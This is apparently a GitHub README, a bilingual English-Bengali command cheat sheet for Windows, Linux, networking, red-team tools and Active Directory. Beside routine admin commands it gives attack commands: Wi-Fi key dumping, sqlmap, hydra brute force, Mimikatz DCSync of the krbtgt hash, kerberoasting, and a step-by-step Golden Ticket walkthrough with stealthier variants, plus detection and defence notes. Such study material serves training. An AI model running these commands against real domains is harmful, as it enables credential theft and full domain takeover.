<div align="center">
  <h1>🛡️ Cyber Command Bible</h1>
  <p><strong>Complete Windows • Linux • PowerShell • Networking • Ethical Hacking + Active Directory Reference</strong></p>
  <p>Educational & Defensive + Red Team Guide 2026</p>

  ![GitHub](https://img.shields.io/badge/GitHub-Rahat830611-blue?style=for-the-badge&logo=github)
  ![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
  <p><strong>Author:</strong> Rahat | Dhaka, Bangladesh</p>
</div>

---

## 📌 রিপোজিটরি সম্পর্কে

এটি আমার ব্যক্তিগত **Cyber Command Wiki** — Windows, Linux, PowerShell, Networking, Ethical Hacking এবং Active Directory Attack এর সম্পূর্ণ কমান্ড রেফারেন্স।  
**সব কমান্ড এক ক্লিকে কপি করা যাবে।**

> **সতর্কতা**: শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে। শুধুমাত্র আইসোলেটেড ল্যাবে (VM) ব্যবহার করুন। অননুমোদিত সিস্টেমে ব্যবহার করবেন না।

---

## 🧭 Quick Jump
- [Windows CMD](#windows-cmd-full-set)
- [PowerShell](#powershell-full-set)
- [Linux](#linux-full-set)
- [Networking](#networking-full-set)
- [Ethical Hacking / Red Team](#ethical-hacking-red-team)
- [Active Directory Attacks](#active-directory-attacks)
- [Incident Response & Forensics](#incident-response--forensics)

---

### 🖥️ Windows CMD Full Set

```cmd
:: System Information
hostname
ver
systeminfo
whoami
whoami /all
wmic cpu get caption, deviceid, name, numberofcores

:: Network Commands
ipconfig /all
ipconfig /flushdns
ipconfig /release
ipconfig /renew
getmac
arp -a
route print
netsh wlan show profile name="WiFiName" key=clear

:: Network Testing
ping google.com -n 10
tracert google.com
nslookup google.com

:: Active Connections
netstat -ano
netstat -anb

:: Users & Groups
net user
net localgroup administrators

:: Process Control
tasklist
taskkill /IM chrome.exe /F
taskkill /PID 1234 /F

:: System Tools
sfc /scannow
chkdsk C: /f /r
driverquery
gpresult /r
বাংলা ব্যাখ্যা:
systeminfo — পুরো কম্পিউটারের বিস্তারিত তথ্য দেখায় (OS, hardware, patch)।
ipconfig /all — IP, DNS, MAC address সহ সম্পূর্ণ নেটওয়ার্ক তথ্য দেখায়।
netstat -ano — কোন পোর্টে কোন প্রসেস চলছে তা দেখায় (সন্দেহজনক কানেকশন খুঁজতে ব্যবহৃত)।
sfc /scannow — উইন্ডোজ সিস্টেম ফাইল চেক করে ক্ষতিগ্রস্ত ফাইল মেরামত করে।
⚡ PowerShell Full Set
# System & Info
Get-ComputerInfo
Get-Date

# Process & Services
Get-Process | Sort CPU -Descending
Get-Service
Stop-Process -Name chrome -Force

# Network
Get-NetIPAddress
Get-NetTCPConnection | Where-Object State -eq Listen

# Security
Get-LocalUser
Get-WinEvent -LogName Security -MaxEvents 100
Get-FileHash .\file.exe -Algorithm SHA256
বাংলা ব্যাখ্যা:
Get-ComputerInfo — উইন্ডোজের আধুনিক ও বিস্তারিত সিস্টেম তথ্য দেয়।
Get-FileHash — ফাইলের SHA256 হ্যাশ তৈরি করে (ম্যালওয়্যার চেক করতে ব্যবহৃত)।
Get-NetTCPConnection — বর্তমানে খোলা পোর্ট ও কানেকশন দেখায়।
🐧 Linux Full Set
# System Information
uname -a
hostnamectl
uptime -p
cat /etc/os-release

# File System
ls -la
pwd
find / -name "*.conf" 2>/dev/null

# Process
ps aux
htop
kill -9 PID

# Network
ip -c addr
ss -tulpn
curl ifconfig.me

# Logs
journalctl -u ssh --since today
lastlog
বাংলা ব্যাখ্যা:
ss -tulpn — লিনাক্সে খোলা পোর্ট ও প্রসেস দেখায় (netstat এর আধুনিক ভার্সন)।
journalctl — সিস্টেম লগ দেখায়, বিশেষ করে SSH লগ চেক করতে খুব উপকারী।
find / -perm -4000 — SUID ফাইল খুঁজে বের করে (প্রিভিলেজ এস্কেলেশনের জন্য ব্যবহৃত)।
🌐 Networking Full Set
ping google.com
traceroute google.com
nslookup google.com
dig google.com ANY
whois domain.com
nmap -sV -O targetip
বাংলা ব্যাখ্যা:
ping — টার্গেটের সাথে কানেকশন আছে কিনা পরীক্ষা করে।
traceroute — প্যাকেট কোন কোন রাউটার দিয়ে যাচ্ছে তা দেখায়।
nmap — টার্গেটের ওপেন পোর্ট, সার্ভিস ও OS আবিষ্কার করে।
🔴 Ethical Hacking / Red Team
# Recon
theHarvester -d target.com -b all
subfinder -d target.com

# Scanning
nmap -sS -sV -A target.com
gobuster dir -u https://target.com -w wordlist.txt

# Exploitation
sqlmap -u "http://target/login" --dbs
hydra -l admin -P rockyou.txt target.com ssh
বাংলা ব্যাখ্যা:
theHarvester — পাবলিক সোর্স থেকে ইমেইল, সাবডোমেইন সংগ্রহ করে।
sqlmap — SQL Injection ভালনারেবিলিটি অটোমেটিক খুঁজে ডাটাবেস বের করে।
hydra — ব্রুটফোর্স অ্যাটাক করে পাসওয়ার্ড ভাঙতে সাহায্য করে।
🔴 Active Directory Attacks
# Enumeration
Get-NetDomain
Get-NetUser
Get-NetGroup

# DCSync (Mimikatz)
lsadump::dcsync /domain:lab.local /user:krbtgt

# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt

# Golden Ticket
kerberos::golden /user:admin /domain:lab.local /sid:S-1-5-... /krbtgt:hash /ptt
বাংলা ব্যাখ্যা (বিশেষ করে DCSync):
DCSync — এটি একটি শক্তিশালী অ্যাটাক। এটি ডোমেইন কন্ট্রোলার থেকে পাসওয়ার্ড হ্যাশ (বিশেষ করে KRBTGT) বের করে আনে বিনা লগইন করে।
কিভাবে কাজ করে?
এটি Directory Replication Service (DRS) প্রোটোকল ব্যবহার করে নিজেকে অন্য একটি ডোমেইন কন্ট্রোলার হিসেবে ভান করে। যদি অ্যাটাকারের কাছে "Replicating Directory Changes" অনুমতি থাকে, তাহলে সে সব ইউজারের NTLM হ্যাশ পেয়ে যায়। পরে এই হ্যাশ দিয়ে Golden Ticket তৈরি করে ডোমেইনের পুরো নিয়ন্ত্রণ নিতে পারে।
🛠️ Incident Response & Forensics
# Windows
tasklist /v
netstat -ano
wmic process get name, commandline

# Linux
ps aux --forest
lsof -i
last
journalctl -xe

# Hash Check
Get-FileHash file.exe -Algorithm SHA256
sha256sum file
বাংলা ব্যাখ্যা:
netstat -ano — সন্দেহজনক কানেকশন খুঁজতে ব্যবহৃত।
last — লিনাক্সে কে কখন লগইন করেছে তার ইতিহাস দেখায়।
Get-FileHash — ফাইলের অখণ্ডতা যাচাই করে (ম্যালওয়্যার পরিবর্তন হয়েছে কিনা বোঝার জন্য)।
🔒 Security Hardening
netsh advfirewall set allprofiles state on
sudo ufw enable
বাংলা ব্যাখ্যা: ফায়ারওয়াল চালু করে অননুমোদিত অ্যাক্সেস বন্ধ করা।
🚀 Best Practices
সবসময় Virtual Machine ব্যবহার করুন
Firewall + MFA চালু রাখুন
নিয়মিত আপডেট নিন
লগ মনিটর করুন

### 🔑 Golden Ticket Attack

প্রয়োজনীয় জিনিস (Prerequisites)
KRBTGT অ্যাকাউন্টের NTLM Hash (সবচেয়ে গুরুত্বপূর্ণ)
Domain SID
Domain Name
Mimikatz / Rubeus টুল
KRBTGT Hash কীভাবে পাবেন? → সাধারণত DCSync অ্যাটাক করে।
Golden Ticket তৈরির ধাপে ধাপে পদ্ধতি
ধাপ ১: তথ্য সংগ্রহ করুন
# Domain Name
whoami /fqdn

# Domain SID (Mimikatz দিয়ে)
mimikatz # lsadump::dcsync /domain:lab.local /user:krbtgt
ধাপ ২: Mimikatz দিয়ে Golden Ticket তৈরি করুন
সবচেয়ে সাধারণ কমান্ড:
mimikatz # kerberos::golden /user:Administrator 
                  /domain:lab.local 
                  /sid:S-1-5-21-1234567890-1234567890-1234567890 
                  /krbtgt:a1b2c3d4e5f6... 
                  /ptt
ব্যাখ্যা প্রত্যেক প্যারামিটারের:
/user:Administrator → যে নামে টিকিট তৈরি করবেন (যেকোনো নাম দিতে পারেন)
/domain:lab.local → আপনার ডোমেইন নাম
/sid:S-1-5-21-... → ডোমেইনের Security Identifier
/krbtgt:xxxxxxxxxxxxxxxx → KRBTGT অ্যাকাউন্টের NTLM Hash
/ptt → Pass The Ticket (বর্তমান সেশনে টিকিট ইনজেক্ট করে)
ধাপ ৩: টিকিট ব্যবহার করে অ্যাক্সেস নিন
# টিকিট সফলভাবে ইনজেক্ট হয়েছে কিনা চেক করুন
mimikatz # kerberos::list

# এখন যেকোনো মেশিনে অ্যাক্সেস নিন
dir \\dc01.lab.local\c$
আরও অ্যাডভান্সড Golden Ticket কমান্ড
# AES256 Key ব্যবহার করে (আরও স্টেল্থি)
mimikatz # kerberos::golden /user:admin 
                  /domain:lab.local 
                  /sid:S-1-5-21-... 
                  /aes256:longaeskeyhere... 
                  /ptt

# Group Membership দিয়ে (Domain Admins)
mimikatz # kerberos::golden /user:admin 
                  /domain:lab.local 
                  /sid:S-1-5-21-... 
                  /krbtgt:hash 
                  /groups:512,513,518,519 
                  /ptt
🔍 কীভাবে ডিটেক্ট করা হয়?
Event ID 4769 (Kerberos Service Ticket Requested) – অস্বাভাবিক পরিমাণে
KRBTGT অ্যাকাউন্ট থেকে অস্বাভাবিক replication (DCSync)
Microsoft Defender for Identity, Sentinel, Corelight টুল ব্যবহার করে
🛡️ প্রতিরোধের উপায় (Defensive)
KRBTGT অ্যাকাউন্টের পাসওয়ার্ড নিয়মিত পরিবর্তন করুন (দুইবার পরিবর্তন করলে পুরনো টিকিট অকেজো হয়ে যায়)।
Tiered Administration Model ব্যবহার করুন।
"Protected Users" গ্রুপে সেনসিটিভ অ্যাকাউন্ট রাখুন।
LAPS + Credential Guard চালু করুন।
Replication permission খুব কম অ্যাকাউন্টকে দিন।

```powershell
# Mimikatz দিয়ে Golden Ticket তৈরি
kerberos::golden /user:Administrator 
                /domain:target.local 
                /sid:S-1-5-21-... 
                /krbtgt:NTLMHASH 
                /ptt
